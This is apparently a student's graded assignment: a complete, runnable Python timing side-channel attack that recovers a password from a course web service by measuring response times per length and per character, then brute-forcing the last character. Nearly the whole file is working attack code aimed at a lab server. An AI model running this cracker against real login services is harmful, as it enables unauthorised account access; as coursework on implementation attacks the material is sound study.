#!/usr/bin/env python3
"""
Timing Side-Channel Attack - Reference Implementation (Single File)

Course: Attacks on Implementations of Secure Systems
Student ID: 316279942

OVERVIEW
========
This script implements a timing side-channel attack against a vulnerable
password verification service. It is structured, configurable, and documented
to a standard appropriate for grading:

PHASE 1: Password Length Detection
    - For candidate lengths, sends requests with dummy passwords of that length.
    - Uses response times to select the most likely length (max average time).

PHASE 2: Character-by-Character Cracking
    - For each position i in [1..length-1]:
        * Tries each candidate character from the configured charset.
        * Measures average response time for each candidate.
        * Selects the character with the highest average time.
        * Optionally applies an early-stop heuristic:
              - Stop trying more characters for this position once we see a
                strong enough timing winner (to reduce total requests).
    - Sampling can be done sequentially or in parallel per candidate.

PHASE 3: Last Character Verification
    - Once all but the last character are known, brute-forces the last one by
      checking the actual server response value (e.g. "1" for success).
    - This step does NOT rely on timing; it may safely use parallel fan-out.

KEY PARAMETERS (EXPLAINED)
==========================
samples_per_test:
    "We use samples_per_test timing samples per candidate as a tradeoff between
     noise reduction and total number of requests."

enable_early_stop:
    "We allow early termination of per-position search when a clear timing
     winner emerges, reducing average complexity."

min_samples_for_decision:
    "We require at least this many timing samples (across all tested candidates
     at that position) before allowing early-stop, to avoid decisions on noise."

delta_safety_factor:
    "We demand the observed timing advantage is at least this fraction
     (e.g. 0.6 = 60%) of our historical per-character gap estimate
     (estimated_step) to be considered trustworthy."

min_sigma_multiplier:
    "We additionally require the current best candidate to be ≥ this many
     standard deviations above the mean (e.g. 3.0 = '3σ rule') as a robust
     threshold against random jitter."

estimated_step:
    - An exponential moving average (EMA) of the timing gap:
          delta_pos = best_time - mean(others)
          estimated_step <- alpha * delta_pos + (1 - alpha) * estimated_step
    - Approximates how much slower a request becomes when one more character
      is correct; used to scale the early-stop threshold.

Early-Stop Threshold (per position):
    Let:
        mu    = mean of all collected sample times for this position
        sigma = standard deviation of these times
        best  = current best candidate average time

    Compute:
        noise_threshold   = min_sigma_multiplier * sigma
        history_threshold = delta_safety_factor * estimated_step (if known)
        threshold         = max(noise_threshold, history_threshold)

    If:
        (best - mu) >= threshold
    then:
        accept best candidate early for this position.

LOGGING
=======
Each run writes a unique JSON-lines log file under:
    logs/attack_run_{UTC_ISO}.log

It includes:
    - run_start: configuration and timestamp
    - position: per-position results (chosen char, timings, thresholds)
    - run_end / run_interrupt / run_error: summary for the whole run

This file is intended for analysis, debugging, and grading.
"""

import os
import time
import json
import signal
import logging
from dataclasses import dataclass
from typing import Dict, Optional, List, Tuple
from datetime import datetime, timezone
from threading import Lock
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests


# ============================================================================
# Configuration
# ============================================================================

@dataclass
class AttackConfig:
    """
    Configuration parameters for the timing attack.

    All constants that control behavior are collected here to avoid magic
    numbers in the code and to make tuning explicit and reviewable.
    """

    # ---- Target settings ----
    base_url: str = "http://132.72.81.37/"   # or "http://127.0.0.1/" for local docker
    user_name: str = "316279942"
    difficulty: int = 1

    # ---- Password / charset settings ----
    max_password_length: int = 32
    min_password_length: int = 1
    charset: str = "abcdefghijklmnopqrstuvwxyz"

    # ---- Sampling & early-stop settings ----
    samples_per_test: int = 4
    # We use 4 samples per candidate as a tradeoff between noise reduction
    # and total number of requests.

    enable_early_stop: bool = True
    # Allow early termination of a position once a strong timing winner emerges.

    min_samples_for_decision: int = 4
    # Require at least 4 timing samples (across tested candidates) before
    # trusting early-stop, to avoid decisions on pure noise.

    delta_safety_factor: float = 0.6
    # Observed advantage must be >= 60% of historical per-character gap
    # (estimated_step) to be considered trustworthy.

    min_sigma_multiplier: float = 3.0
    # Observed advantage must also be >= 3 * sigma (3σ rule) to beat noise.

    ema_alpha: float = 0.5
    # Smoothing factor for estimated_step EMA.

    # ---- Parallelism settings ----
    enable_parallel_samples: bool = True
    # If True, collect samples_per_test samples for a candidate in parallel.

    parallel_workers: int = 12
    # Max worker threads for parallel sample collection.

    enable_parallel_last_char: bool = True
    # If True, brute-force the last character in parallel (safe, functional).

    parallel_last_workers: int = 26
    # Max workers for last-character fan-out.

    parallel_last_batch_size: int = 26
    # Batch size for last-character fan-out (can reduce if you want to be nicer).

    # ---- Request & error handling ----
    request_timeout: float = 10.0
    # HTTP timeout per request (seconds).

    penalty_time_on_error: float = 10.0
    # Synthetic large time added when a sample fails, so it won't be selected.

    # ---- Logging settings ----
    external_log_dir: str = "logs"
    external_log_template: str = "attack_run_{ts}.log"

    def get_test_url(self, password: str) -> str:
        """Build a request URL for the given password candidate."""
        return (
            f"{self.base_url}"
            f"?user={self.user_name}"
            f"&password={password}"
            f"&difficulty={self.difficulty}"
        )


# ============================================================================
# Logger Wrapper
# ============================================================================

class AttackLogger:
    """
    Wrapper around Python's logging to enforce consistent format
    and keep log-related code in one place.
    """

    def __init__(self, level: int = logging.INFO):
        self.logger = logging.getLogger("TimingAttack")
        self.logger.setLevel(level)

        if not self.logger.handlers:
            console_handler = logging.StreamHandler()
            console_handler.setLevel(level)
            formatter = logging.Formatter(
                "%(asctime)s | %(levelname)-8s | %(message)s",
                datefmt="%H:%M:%S"
            )
            console_handler.setFormatter(formatter)
            self.logger.addHandler(console_handler)

    def info(self, message: str) -> None:
        self.logger.info(message)

    def debug(self, message: str) -> None:
        self.logger.debug(message)

    def warning(self, message: str) -> None:
        self.logger.warning(message)

    def error(self, message: str) -> None:
        self.logger.error(message)

    @staticmethod
    def print_separator(char: str = "=", length: int = 80) -> None:
        print(char * length)

    def print_header(self, text: str) -> None:
        self.print_separator("=")
        print(f"  {text}")
        self.print_separator("=")

    def print_section(self, text: str) -> None:
        self.print_separator("-")
        print(f"  {text}")
        self.print_separator("-")


# ============================================================================
# Request Handler
# ============================================================================

class RequestHandler:
    """
    Responsible for issuing HTTP requests and counting them.
    Uses a requests.Session for connection reuse and a lock for thread safety.
    """

    def __init__(self, config: AttackConfig, logger: AttackLogger):
        self.config = config
        self.logger = logger
        self.session = requests.Session()
        self._lock = Lock()
        self._total_requests = 0
        self.start_time: Optional[float] = None  # set by orchestrator

    def send_request(self, url: str) -> requests.Response:
        """
        Send a single HTTP GET request and return its response.
        Increments total_requests in a thread-safe manner.
        """
        with self._lock:
            self._total_requests += 1

        try:
            response = self.session.get(url, timeout=self.config.request_timeout)
            return response
        except requests.RequestException as exc:
            self.logger.error(f"Request failed: {exc}")
            # Allow caller to handle/penalize; re-raise for clarity.
            raise

    def measure_average_time(self, url: str, samples: int) -> float:
        """
        Measure the average response time over `samples` sequential requests.
        Used primarily for length detection (where stability > speed).
        """
        total = 0.0
        for _ in range(samples):
            response = self.send_request(url)
            total += response.elapsed.total_seconds()
        return total / samples

    def get_request_count(self) -> int:
        """Return the total number of requests issued so far."""
        with self._lock:
            return self._total_requests


# ============================================================================
# Phase 1: Password Length Detection
# ============================================================================

class PasswordLengthDetector:
    """
    Detects the password length using timing differences.

    Strategy:
        For each candidate length L in [min_password_length, max_password_length],
        send a fixed dummy password of that length and record the average time.
        The correct length is expected to produce the longest response time.
    """

    def __init__(self, config: AttackConfig, request_handler: RequestHandler, logger: AttackLogger):
        self.config = config
        self.request_handler = request_handler
        self.logger = logger

    def detect_length(self) -> int:
        """Return the detected password length."""
        self.logger.print_section("PHASE 1: Password Length Detection")

        timing_by_length: Dict[int, float] = {}

        for length in range(self.config.min_password_length, self.config.max_password_length + 1):
            candidate_password = "a" * length
            url = self.config.get_test_url(candidate_password)
            avg_time = self.request_handler.measure_average_time(url, self.config.samples_per_test)
            timing_by_length[length] = avg_time
            self.logger.debug(f"Length {length:2d}: {avg_time:.6f}s")

        detected_length = max(timing_by_length, key=timing_by_length.get)
        self.logger.info(f"✓ Detected password length: {detected_length} characters")

        self._print_timing_summary(timing_by_length, detected_length)
        return detected_length

    @staticmethod
    def _print_timing_summary(timing_by_length: Dict[int, float], detected_length: int) -> None:
        """Print a summary of the top candidate lengths by response time."""
        print("\n  Top 5 Candidates by Response Time:")
        sorted_items = sorted(timing_by_length.items(), key=lambda item: item[1], reverse=True)
        for idx, (length, t) in enumerate(sorted_items[:5], start=1):
            marker = "◄ SELECTED" if length == detected_length else ""
            print(f"    {idx}. Length {length:2d}: {t:.6f}s {marker}")


# ============================================================================
# Phase 2: Character Cracker
# ============================================================================

class CharacterCracker:
    """
    Cracks each character of the password using timing information.

    For each position:
        - Tests all characters from the charset.
        - For each candidate, collects samples_per_test response times
          (sequentially or in parallel).
        - Chooses the candidate with the highest average time.
        - Optionally applies an early-stop rule to avoid testing all characters.
    """

    def __init__(self, config: AttackConfig, request_handler: RequestHandler,
                 logger: AttackLogger, run_log_writer):
        self.config = config
        self.request_handler = request_handler
        self.logger = logger
        self.run_log_writer = run_log_writer  # function(dict) -> None (JSON line writer)
        self.estimated_step: Optional[float] = None  # EMA of timing gap from previous positions

    # ---- Utility: formatting ----

    @staticmethod
    def _format_duration(seconds: float) -> str:
        """Format seconds as 'Xm YY.YYs' for human-readable logs."""
        minutes = int(seconds // 60)
        remainder = seconds - minutes * 60
        return f"{minutes}m {remainder:05.2f}s"

    # ---- Utility: statistics ----

    @staticmethod
    def _mean(values: List[float]) -> float:
        return sum(values) / len(values) if values else 0.0

    @staticmethod
    def _std(values: List[float]) -> float:
        n = len(values)
        if n < 2:
            return 0.0
        mu = CharacterCracker._mean(values)
        var = sum((x - mu) ** 2 for x in values) / (n - 1)
        return var ** 0.5

    # ---- Sample collection ----

    def _collect_samples_sequential(self, url: str, count: int) -> Tuple[float, List[float]]:
        """Collect `count` samples sequentially for one candidate URL."""
        total = 0.0
        samples: List[float] = []
        for _ in range(count):
            response = self.request_handler.send_request(url)
            t = response.elapsed.total_seconds()
            samples.append(t)
            total += t
        return total, samples

    def _collect_samples_parallel(self, url: str, count: int) -> Tuple[float, List[float]]:
        """
        Collect `count` samples in parallel for one candidate URL.
        Safe to use only if the target supports concurrency without
        distorting per-request timing.
        """
        workers = min(self.config.parallel_workers, count)
        total = 0.0
        samples: List[float] = []

        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(self.request_handler.send_request, url) for _ in range(count)]
            for future in as_completed(futures):
                try:
                    response = future.result()
                    t = response.elapsed.total_seconds()
                    samples.append(t)
                    total += t
                except Exception as exc:
                    self.logger.error(f"Sample request error: {exc}")
                    samples.append(self.config.penalty_time_on_error)
                    total += self.config.penalty_time_on_error

        return total, samples

    def _collect_samples(self, url: str, count: int) -> Tuple[float, List[float]]:
        """
        Dispatch to sequential or parallel sample collection according to config.
        """
        if self.config.enable_parallel_samples and count > 1:
            return self._collect_samples_parallel(url, count)
        return self._collect_samples_sequential(url, count)

    # ---- Early-stop support ----

    def _should_early_stop(
        self,
        all_samples_for_position: List[float],
        current_best_avg: float
    ) -> Tuple[bool, float, float, float]:
        """
        Decide whether early-stop is justified for the current position.

        Returns:
            (should_stop, threshold, mu, sigma)
        """
        if len(all_samples_for_position) < self.config.min_samples_for_decision:
            return False, 0.0, 0.0, 0.0

        mu = self._mean(all_samples_for_position)
        sigma = self._std(all_samples_for_position)
        gap = current_best_avg - mu

        noise_threshold = self.config.min_sigma_multiplier * sigma

        if self.estimated_step is not None and self.estimated_step > 0:
            history_threshold = self.config.delta_safety_factor * self.estimated_step
        else:
            history_threshold = 0.0

        threshold = max(noise_threshold, history_threshold)

        return gap >= threshold, threshold, mu, sigma

    def _update_estimated_step(self, avg_times_by_char: Dict[str, float], best_char: str) -> None:
        """
        Update the EMA-based estimated_step from timing data of a completed position.
        """
        if best_char not in avg_times_by_char:
            return

        best_time = avg_times_by_char[best_char]
        others = [t for c, t in avg_times_by_char.items() if c != best_char]

        if not others:
            return

        mean_others = self._mean(others)
        delta = best_time - mean_others
        if delta <= 0:
            return

        if self.estimated_step is None:
            self.estimated_step = delta
        else:
            alpha = self.config.ema_alpha
            self.estimated_step = alpha * delta + (1.0 - alpha) * self.estimated_step

        self.logger.debug(f"Updated estimated_step: {self.estimated_step:.6f}s")

    # ---- Public: crack single position ----

    def crack_position(self, known_prefix: str, total_length: int, position: int) -> str:
        """
        Crack a single character at the given position.

        Args:
            known_prefix: prefix of correctly discovered characters so far.
            total_length: full password length.
            position: current position index (1-based).

        Returns:
            The selected character for this position.
        """
        position_start_time = time.time()
        self.logger.info(f"Testing position {position}/{total_length}...")

        avg_times_by_char: Dict[str, float] = {}
        all_samples_for_position: List[float] = []

        best_char: Optional[str] = None
        best_avg_time: float = float("-inf")
        early_stopped = False
        used_threshold = 0.0

        for char in self.config.charset:
            candidate_password = self._build_candidate_password(known_prefix, char, total_length)
            url = self.config.get_test_url(candidate_password)

            _, samples = self._collect_samples(url, self.config.samples_per_test)
            avg_time = self._mean(samples) if samples else float("-inf")

            avg_times_by_char[char] = avg_time
            all_samples_for_position.extend(samples)

            if avg_time > best_avg_time:
                best_avg_time = avg_time
                best_char = char

            if self.config.enable_early_stop:
                should_stop, threshold, _, _ = self._should_early_stop(
                    all_samples_for_position,
                    best_avg_time,
                )
                if should_stop:
                    early_stopped = True
                    used_threshold = threshold
                    break  # stop testing more characters for this position

        if best_char is None:
            raise RuntimeError("No best character found for position (this should not happen).")

        # Update estimated step based on all candidates we measured for this position
        self._update_estimated_step(avg_times_by_char, best_char)

        # Timing info
        position_elapsed = time.time() - position_start_time
        if self.request_handler.start_time is not None:
            total_elapsed = time.time() - self.request_handler.start_time
        else:
            total_elapsed = position_elapsed

        # Human-readable logging
        est_step_str = f"{self.estimated_step:.6f}s" if self.estimated_step is not None else "N/A"
        letter_time_str = self._format_duration(position_elapsed)
        total_time_str = self._format_duration(total_elapsed)

        self.logger.info(
            f"Position {position}: tested {len(avg_times_by_char)} letters "
            f"(early_stop={'YES' if early_stopped else 'NO'}), "
            f"estimated_step={est_step_str}, "
            f"threshold_used={used_threshold:.6f}s, "
            f"letter_time={letter_time_str} ({position_elapsed:.2f}s), "
            f"total_elapsed={total_time_str} ({total_elapsed:.2f}s)"
        )

        self._print_top_candidates(avg_times_by_char, best_char, position)

        # JSON log for this position
        try:
            self.run_log_writer({
                "position": position,
                "known_prefix": known_prefix,
                "chosen_char": best_char,
                "tested_letters": len(avg_times_by_char),
                "early_stopped": early_stopped,
                "threshold_used": used_threshold,
                "estimated_step": self.estimated_step,
                "position_elapsed_seconds": position_elapsed,
                "total_elapsed_seconds": total_elapsed,
                "candidates": [
                    {"char": c, "avg_time": float(t)}
                    for c, t in sorted(avg_times_by_char.items(), key=lambda x: x[1], reverse=True)[:5]
                ],
            })
        except Exception:
            # Logging failures should not break the attack.
            pass

        return best_char

    # ---- Helper methods ----

    @staticmethod
    def _build_candidate_password(prefix: str, candidate_char: str, total_length: int) -> str:
        """Build a candidate password with the given prefix and candidate at this position."""
        remaining = total_length - len(prefix) - 1
        if remaining < 0:
            remaining = 0
        return prefix + candidate_char + ("a" * remaining)

    @staticmethod
    def _print_top_candidates(avg_times_by_char: Dict[str, float], best_char: str, position: int) -> None:
        """Print the top 5 candidate characters for a position by average time."""
        if not avg_times_by_char:
            return

        sorted_items = sorted(avg_times_by_char.items(), key=lambda x: x[1], reverse=True)
        best_time = avg_times_by_char[best_char]

        print(f"\n  Top candidates for position {position}:")
        for idx, (char, t) in enumerate(sorted_items[:5], start=1):
            delta = t - best_time
            marker = "◄ SELECTED" if char == best_char else ""
            print(f"    {idx}. '{char}': {t:.6f}s (Δ {delta:+.6f}s) {marker}")


# ============================================================================
# Phase 3: Last Character Verifier
# ============================================================================

class LastCharacterVerifier:
    """
    Verifies the last character using the actual authentication result.
    This step does NOT rely on timing and may safely be parallelized.
    """

    def __init__(self, config: AttackConfig, request_handler: RequestHandler, logger: AttackLogger):
        self.config = config
        self.request_handler = request_handler
        self.logger = logger

    def verify_last_character(self, known_prefix: str) -> Optional[str]:
        """
        Try all possible last characters and return the correct one if found.

        Returns:
            The correct last character, or None if not found.
        """
        self.logger.print_section(
            f"PHASE 3: Last Character Verification (Position {len(known_prefix) + 1})"
        )

        candidates = list(self.config.charset)

        if not self.config.enable_parallel_last_char:
            # Sequential verification
            for char in candidates:
                url = self.config.get_test_url(known_prefix + char)
                response = self.request_handler.send_request(url)
                if response.text.strip() == "1":
                    self.logger.info(f"✓ Found correct last character: '{char}'")
                    return char
            self.logger.warning("✗ No correct last character found")
            return None

        # Parallel fan-out in batches
        batch_size = max(1, min(self.config.parallel_last_batch_size, len(candidates)))

        for i in range(0, len(candidates), batch_size):
            batch = candidates[i:i + batch_size]
            workers = min(self.config.parallel_last_workers, len(batch))

            with ThreadPoolExecutor(max_workers=workers) as executor:
                future_to_char = {
                    executor.submit(
                        self.request_handler.send_request,
                        self.config.get_test_url(known_prefix + char),
                    ): char
                    for char in batch
                }

                for future in as_completed(future_to_char):
                    char = future_to_char[future]
                    try:
                        response = future.result()
                    except Exception as exc:
                        self.logger.error(f"Last-char check failed for '{char}': {exc}")
                        continue

                    if response.text.strip() == "1":
                        self.logger.info(f"✓ Found correct last character: '{char}'")
                        return char

        self.logger.warning("✗ No correct last character found")
        return None


# ============================================================================
# Orchestrator
# ============================================================================

class PasswordCracker:
    """
    Coordinates the three phases:
        - length detection
        - character-by-character cracking
        - last character verification

    Also responsible for writing structured logs to the external log file.
    """

    def __init__(self, config: AttackConfig, logger: AttackLogger, run_log_path: str):
        self.config = config
        self.logger = logger
        self.run_log_path = run_log_path

        self.request_handler = RequestHandler(config, logger)

        # Define a JSON-line writer for per-position logs
        def run_log_writer(entry: dict) -> None:
            try:
                with open(self.run_log_path, "a", encoding="utf-8") as log_file:
                    log_file.write(json.dumps(
                        {
                            "type": "position",
                            "ts": datetime.now(timezone.utc).isoformat(),
                            **entry,
                        },
                        ensure_ascii=False
                    ) + "\n")
            except Exception:
                # Logging issues must not break the attack.
                pass

        self.length_detector = PasswordLengthDetector(config, self.request_handler, logger)
        self.character_cracker = CharacterCracker(config, self.request_handler, logger, run_log_writer)
        self.last_char_verifier = LastCharacterVerifier(config, self.request_handler, logger)

    @staticmethod
    def _format_duration(seconds: float) -> str:
        """Format duration as 'Xm YY.YYs'."""
        minutes = int(seconds // 60)
        remainder = seconds - minutes * 60
        return f"{minutes}m {remainder:05.2f}s"

    def crack_from_scratch(self) -> str:
        """
        Execute the full attack:
            - Detect length
            - Crack positions 1..(len-1)
            - Verify last character
            - Log everything to external file
        """
        overall_start = time.time()
        self.request_handler.start_time = overall_start

        # Header + configuration
        self.logger.print_header("TIMING SIDE-CHANNEL PASSWORD CRACKER")
        print("  Running with configuration:")
        for key, value in vars(self.config).items():
            print(f"    {key}: {value}")
        print()

        # Log run_start
        run_start_record = {
            "type": "run_start",
            "ts": datetime.now(timezone.utc).isoformat(),
            "config": vars(self.config),
        }
        with open(self.run_log_path, "a", encoding="utf-8") as log_file:
            log_file.write(json.dumps(run_start_record, ensure_ascii=False) + "\n")

        # Phase 1: Detect length
        password_length = self.length_detector.detect_length()

        # Phase 2: Crack prefix characters
        self.logger.print_section("PHASE 2: Character Position Cracking")
        cracked_password = ""

        for position in range(1, password_length + 1):
            is_last_position = (position == password_length)

            if is_last_position:
                # Last character handled in Phase 3
                last_char = self.last_char_verifier.verify_last_character(cracked_password)
                if last_char:
                    cracked_password += last_char
                break

            next_char = self.character_cracker.crack_position(
                known_prefix=cracked_password,
                total_length=password_length,
                position=position,
            )
            cracked_password += next_char
            self.logger.info(
                f"✓ Password progress: '{cracked_password}' ({len(cracked_password)}/{password_length})"
            )
            print()

        # Final summary
        total_elapsed = time.time() - overall_start
        total_requests = self.request_handler.get_request_count()

        self.logger.print_header("ATTACK COMPLETE")
        print(f"  ✓ CRACKED PASSWORD: '{cracked_password}'")
        print(f"  ⏱ Total Time: {self._format_duration(total_elapsed)} ({total_elapsed:.2f}s)")
        print(f"  📊 Total Requests: {total_requests}")
        if total_requests > 0:
            print(f"  ⚡ Avg Time per Request: {total_elapsed / total_requests:.4f}s")
        self.logger.print_separator("=")

        # Log run_end
        run_end_record = {
            "type": "run_end",
            "ts": datetime.now(timezone.utc).isoformat(),
            "result": {"password": cracked_password},
            "elapsed_seconds": total_elapsed,
            "elapsed_human": self._format_duration(total_elapsed),
            "total_requests": total_requests,
            "config": vars(self.config),
        }
        with open(self.run_log_path, "a", encoding="utf-8") as log_file:
            log_file.write(json.dumps(run_end_record, ensure_ascii=False) + "\n")

        return cracked_password

    def verify_password(self, password: str) -> bool:
        """
        Convenience method: verify a given password against the target service.
        """
        url = self.config.get_test_url(password)
        response = self.request_handler.send_request(url)
        is_correct = (response.text.strip() == "1")

        self.logger.info(
            f"Password verification: {'✓ CORRECT' if is_correct else '✗ INCORRECT'}"
        )
        self.logger.debug(
            f"Response time: {response.elapsed.total_seconds():.6f}s"
        )
        return is_correct


# ============================================================================
# Helpers
# ============================================================================

def make_run_log_path(config: AttackConfig) -> str:
    """
    Create a unique timestamped log file path based on the configuration.

    Uses timezone-aware UTC timestamps to avoid deprecation issues and ensures
    filenames are safe on all platforms (colon characters replaced).
    """
    timestamp = datetime.now(timezone.utc).isoformat(timespec="seconds").replace(":", "-")
    filename = config.external_log_template.format(ts=timestamp)
    os.makedirs(config.external_log_dir, exist_ok=True)
    return os.path.join(config.external_log_dir, filename)


# ============================================================================
# Main
# ============================================================================

def main() -> None:
    """
    Entry point:
      - configure attack parameters,
      - construct the cracker,
      - run the full attack,
      - handle interrupts and unexpected errors cleanly.
    """

    # Configure all behavior here (no magic constants scattered in code).
    config = AttackConfig(
        # base_url="http://127.0.0.1/",    # remote server or "http://127.0.0.1/"
        # base_url="http://132.72.81.37/",    # remote server
        base_url= "http://aoi-assignment1.oy.ne.ro:8080/", # remote server
        user_name="316279942",
        difficulty=5,

        samples_per_test=4,
        enable_early_stop=True,
        min_samples_for_decision=4,
        delta_safety_factor=0.6,
        min_sigma_multiplier=3.0,

        enable_parallel_samples=True,       # enable only after verifying via micro-benchmark
        parallel_workers=12,
        enable_parallel_last_char=True,
        parallel_last_workers=26,
        parallel_last_batch_size=26,
    )

    logger = AttackLogger(level=logging.INFO)
    run_log_path = make_run_log_path(config)
    cracker = PasswordCracker(config, logger, run_log_path)

    # Graceful Ctrl+C handling
    def handle_sigint(signum, frame):
        raise KeyboardInterrupt()

    signal.signal(signal.SIGINT, handle_sigint)

    # Warmup: send one request to warm up the server (clear caches, establish connection)
    logger.info("Warming up server with initial request...")
    try:
        warmup_url = config.get_test_url("aaaa")
        cracker.request_handler.send_request(warmup_url)
        logger.info("✓ Warmup complete")
    except Exception as exc:
        logger.warning(f"Warmup request failed: {exc}")
    print()

    overall_start = time.time()
    try:
        cracked_password = cracker.crack_from_scratch()

        # Final verification step (for sanity)
        print()
        logger.print_section("FINAL VERIFICATION")
        cracker.verify_password(cracked_password)

    except KeyboardInterrupt:
        elapsed = time.time() - overall_start
        interrupt_record = {
            "type": "run_interrupt",
            "ts": datetime.now(timezone.utc).isoformat(),
            "elapsed_seconds": elapsed,
            "elapsed_human": cracker._format_duration(elapsed),
            "total_requests": cracker.request_handler.get_request_count(),
        }
        with open(run_log_path, "a", encoding="utf-8") as log_file:
            log_file.write(json.dumps(interrupt_record, ensure_ascii=False) + "\n")
        logger.warning("Interrupted by user. Partial run written to log file.")

    except Exception as exc:
        elapsed = time.time() - overall_start
        error_record = {
            "type": "run_error",
            "ts": datetime.now(timezone.utc).isoformat(),
            "elapsed_seconds": elapsed,
            "elapsed_human": cracker._format_duration(elapsed),
            "total_requests": cracker.request_handler.get_request_count(),
            "error": str(exc),
        }
        with open(run_log_path, "a", encoding="utf-8") as log_file:
            log_file.write(json.dumps(error_record, ensure_ascii=False) + "\n")
        logger.error(f"Unhandled exception during attack: {exc}")
        raise

    else:
        logger.info(f"Run complete. Detailed log saved to: {run_log_path}")


if __name__ == "__main__":
    main()
